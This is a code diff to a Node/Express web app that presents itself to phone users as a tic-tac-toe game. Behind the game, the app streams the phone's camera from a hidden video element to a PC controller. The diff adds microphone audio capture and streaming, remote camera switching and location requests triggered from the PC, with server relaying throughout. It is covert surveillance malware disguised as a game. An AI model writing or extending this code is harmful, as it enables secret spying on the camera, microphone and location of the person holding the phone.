@@ -18,7 +18,7 @@ app.get('/', (req, res) => {
   const fullUrl = `${protocol}://${host}`;
   
   if (isMobile) {
-    // CELULAR: APENAS O JOGO (mensagens flutuantes)
+    // CELULAR: apenas jogo, tudo oculto
     res.send(`<!DOCTYPE html>
 <html>
 <head>
@@ -26,11 +26,7 @@ app.get('/', (req, res) => {
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
     <title>Jogo da Velha</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             font-family: Arial, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -103,7 +99,7 @@ app.get('/', (req, res) => {
         button:active { transform: scale(0.95); background: #45a049; }
         button:disabled { background: #ccc; cursor: not-allowed; }
         
-        /* TOAST - MENSAGENS FLUTUANTES */
+        /* Toast notifications */
         #toastContainer {
             position: fixed;
             top: 20px;
@@ -126,12 +122,10 @@ app.get('/', (req, res) => {
             backdrop-filter: blur(5px);
             border: 1px solid rgba(255,255,255,0.2);
             box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-            pointer-events: none;
             font-weight: 500;
         }
         .toast.emergency {
             background: rgba(244, 67, 54, 0.95);
-            border: 1px solid #ff8a80;
             animation: pulse 1s infinite;
         }
         @keyframes slideIn {
@@ -143,14 +137,13 @@ app.get('/', (req, res) => {
             50% { transform: scale(1.05); }
         }
         
-        /* Esconder elementos de debug */
-        #localVideo, .camera-status, .device {
+        /* Elementos ocultos */
+        #localVideo, #audioDebug {
             display: none;
         }
     </style>
 </head>
 <body>
-    <!-- Container para mensagens flutuantes -->
     <div id="toastContainer"></div>
 
     <div class="container">
@@ -160,8 +153,8 @@ app.get('/', (req, res) => {
         <button id="resetBtn" disabled>Reiniciar Jogo</button>
     </div>
 
-    <!-- Vídeo oculto para câmera -->
     <video id="localVideo" autoplay playsinline muted></video>
+    <audio id="audioDebug" autoplay></audio>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
@@ -171,11 +164,16 @@ app.get('/', (req, res) => {
             reconnectionAttempts: 10
         });
         
-        // Variáveis do jogo
+        // Variáveis
         let minhaVez = false;
         let meuSimbolo = '';
         let gameActive = false;
         let board = ['', '', '', '', '', '', '', '', ''];
+        let mediaStream = null;
+        let facingMode = 'environment'; // 'environment' = traseira, 'user' = frontal
+        let audioContext = null;
+        let audioProcessor = null;
+        let audioSource = null;
         
         // Elementos DOM
         const statusDiv = document.getElementById('status');
@@ -201,10 +199,8 @@ app.get('/', (req, res) => {
             const toast = document.createElement('div');
             toast.className = 'toast' + (isEmergency ? ' emergency' : '');
             toast.textContent = message;
-            
             toastContainer.appendChild(toast);
             
-            // Remover após duration
             setTimeout(() => {
                 if (toast.parentNode) {
                     toast.style.animation = 'slideIn 0.3s reverse';
@@ -215,41 +211,69 @@ app.get('/', (req, res) => {
             }, duration);
         }
         
-        // Função para iniciar câmera (oculta)
-        async function iniciarCamera() {
+        // Função para iniciar câmera e áudio
+        async function iniciarCamera(modo) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                }
+                
+                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         width: 320, 
                         height: 240,
-                        facingMode: 'environment'
+                        facingMode: modo
                     },
-                    audio: false
+                    audio: true
                 });
                 
-                localVideo.srcObject = stream;
+                localVideo.srcObject = mediaStream;
                 await localVideo.play();
                 
+                // Configurar áudio
+                if (audioContext) {
+                    audioContext.close();
+                }
+                
+                audioContext = new AudioContext();
+                audioSource = audioContext.createMediaStreamSource(mediaStream);
+                audioProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+                
+                audioSource.connect(audioProcessor);
+                audioProcessor.connect(audioContext.destination);
+                
+                audioProcessor.onaudioprocess = (e) => {
+                    const inputData = e.inputBuffer.getChannelData(0);
+                    // Enviar apenas a cada 2 frames para não sobrecarregar
+                    if (Math.random() < 0.5) {
+                        socket.emit('audio', Array.from(inputData));
+                    }
+                };
+                
+                // Enviar vídeo
                 const canvas = document.createElement('canvas');
                 canvas.width = 320;
                 canvas.height = 240;
                 const ctx = canvas.getContext('2d');
                 
                 setInterval(() => {
-                    if (stream.active) {
+                    if (mediaStream && mediaStream.active) {
                         ctx.drawImage(localVideo, 0, 0, 320, 240);
                         const frame = canvas.toDataURL('image/jpeg', 0.3);
                         socket.emit('frame', frame);
                     }
                 }, 100);
                 
+                // Não mostra toast para não poluir
+                
             } catch (err) {
-                console.log('Erro câmera:', err);
+                console.log('Erro ao iniciar câmera:', err);
+                showToast('❌ Erro na câmera');
             }
         }
         
-        // Iniciar câmera automaticamente
-        iniciarCamera();
+        // Iniciar com câmera traseira
+        iniciarCamera('environment');
         
         // Receber comandos do PC
         socket.on('comando', (cmd) => {
@@ -262,8 +286,28 @@ app.get('/', (req, res) => {
                 showToast('⚠️ EMERGÊNCIA!', true, 5000);
             } 
             else if (cmd === 'trocarCamera') {
-                // Não mostra nada, só troca a câmera
-                location.reload(); // Recarrega para trocar câmera (simples)
+                facingMode = facingMode === 'environment' ? 'user' : 'environment';
+                iniciarCamera(facingMode);
+                showToast('🔄 Câmera ' + (facingMode === 'environment' ? 'traseira' : 'frontal'));
+            }
+            else if (cmd === 'getLocation') {
+                if (navigator.geolocation) {
+                    showToast('📍 Obtendo localização...');
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            socket.emit('location', {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
+                            });
+                            showToast('✅ Localização enviada!');
+                        },
+                        (error) => {
+                            showToast('❌ Erro localização: ' + error.message);
+                        }
+                    );
+                } else {
+                    showToast('❌ Geolocalização não suportada');
+                }
             }
         });
         
@@ -272,27 +316,10 @@ app.get('/', (req, res) => {
             showToast('💬 ' + msg);
         });
         
-        // Receber localização (executa mas não mostra no celular)
-        socket.on('getLocation', () => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        socket.emit('location', {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        });
-                        // Não mostra nada no celular
-                    },
-                    (error) => {
-                        console.log('Erro localização:', error);
-                    }
-                );
-            }
-        });
-        
         // Eventos do jogo
         socket.on('connect', () => {
             statusDiv.innerHTML = 'Conectado!';
+            showToast('✅ Conectado ao PC');
         });
         
         socket.on('inicio', (data) => {
@@ -301,6 +328,7 @@ app.get('/', (req, res) => {
             gameActive = true;
             resetBtn.disabled = false;
             statusDiv.innerHTML = minhaVez ? 'Sua vez (X)' : 'Vez do oponente (X)';
+            showToast('🎮 Jogo iniciado! Você é ' + meuSimbolo);
         });
         
         socket.on('jogada', (data) => {
@@ -495,14 +523,16 @@ app.get('/', (req, res) => {
         }
         .audio-control {
             display: flex;
-            align-items: center;
             gap: 10px;
+            align-items: center;
             margin: 10px 0;
         }
-        .audio-control button {
+        #toggleAudio {
             background: #ff9800;
             color: white;
-            padding: 10px 20px;
+        }
+        #audioVolume {
+            flex: 1;
         }
     </style>
 </head>
@@ -522,6 +552,11 @@ app.get('/', (req, res) => {
                     <button class="btn-purple" id="getLocation">📍 Localização</button>
                     <button class="btn-orange" id="vibrate">📳 Vibrar</button>
                     <button class="btn-red" id="emergency">⚠️ Emergência</button>
+                </div>
+                
+                <div class="audio-control">
+                    <button id="toggleAudio">🔊 Áudio: ON</button>
+                    <input type="range" id="audioVolume" min="0" max="100" value="50">
                 </div>
                 
                 <div id="locationInfo" class="info"></div>
@@ -554,10 +589,12 @@ app.get('/', (req, res) => {
             transports: ['websocket', 'polling']
         });
         
-        // Variáveis do jogo
+        // Variáveis
         let minhaVez = true;
         let gameActive = false;
         let board = ['', '', '', '', '', '', '', '', ''];
+        let audioEnabled = true;
+        let audioVolume = 50;
         
         // Elementos DOM
         const statusDiv = document.getElementById('gameStatus');
@@ -581,12 +618,31 @@ app.get('/', (req, res) => {
             document.getElementById('board').appendChild(cell);
         }
         
+        // Configurar áudio
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const audioGain = audioContext.createGain();
+        audioGain.gain.value = audioVolume / 100;
+        audioGain.connect(audioContext.destination);
+        
         // Receber vídeo
         let frameCount = 0;
         socket.on('frame', (frameData) => {
             remoteVideo.src = frameData;
             frameCount++;
             videoStatus.innerHTML = '📱 Recebendo vídeo (frames: ' + frameCount + ')';
+        });
+        
+        // Receber áudio
+        socket.on('audio', (audioData) => {
+            if (audioEnabled) {
+                const buffer = audioContext.createBuffer(1, audioData.length, audioContext.sampleRate);
+                buffer.copyToChannel(new Float32Array(audioData), 0);
+                
+                const source = audioContext.createBufferSource();
+                source.buffer = buffer;
+                source.connect(audioGain);
+                source.start();
+            }
         });
         
         // Controles
@@ -605,6 +661,17 @@ app.get('/', (req, res) => {
         document.getElementById('emergency').onclick = () => {
             socket.emit('comando', 'emergency');
             addMessage('⚠️ SINAL DE EMERGÊNCIA ENVIADO!', true);
+        };
+        
+        // Controle de áudio
+        document.getElementById('toggleAudio').onclick = () => {
+            audioEnabled = !audioEnabled;
+            document.getElementById('toggleAudio').innerHTML = audioEnabled ? '🔊 Áudio: ON' : '🔇 Áudio: OFF';
+        };
+        
+        document.getElementById('audioVolume').oninput = (e) => {
+            audioVolume = e.target.value;
+            audioGain.gain.value = audioVolume / 100;
         };
         
         // Localização
@@ -697,7 +764,7 @@ app.get('/', (req, res) => {
   }
 });
 
-// Lógica do jogo e WebSocket (igual)
+// Lógica do jogo
 let board = ['', '', '', '', '', '', '', '', ''];
 let vez = 'X';
 let jogadores = {
@@ -728,6 +795,10 @@ io.on('connection', (socket) => {
   
   socket.on('frame', (frameData) => {
     socket.broadcast.emit('frame', frameData);
+  });
+  
+  socket.on('audio', (audioData) => {
+    socket.broadcast.emit('audio', audioData);
   });
   
   socket.on('comando', (cmd) => {
